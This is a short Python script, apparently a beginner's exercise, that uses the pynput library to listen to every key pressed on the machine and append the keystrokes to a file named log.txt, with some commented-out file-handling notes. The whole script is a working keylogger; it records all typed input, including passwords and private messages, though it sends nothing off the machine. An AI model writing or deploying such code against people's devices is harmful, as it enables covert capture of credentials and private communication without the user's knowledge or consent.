from pynput.keyboard import Listener
# storing the keystroke in a text file
# file handling - How to read, write and append to a file

# f = open('log.txt', 'a')
# # file_data = f.read()
# # print(file_data)
# f.write("\nyes")
# f.close()

def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'", "")

    if letter == 'Key.space':
        letter = ' '
    elif letter == 'Key.shift_r' or letter == 'Key.shift':
        letter = ''
    elif letter == 'Key.enter':
        letter = '\n'
    with open('log.txt', 'a') as file_data:
        file_data.write(letter)


with Listener(on_press=write_to_file) as l:
    l.join()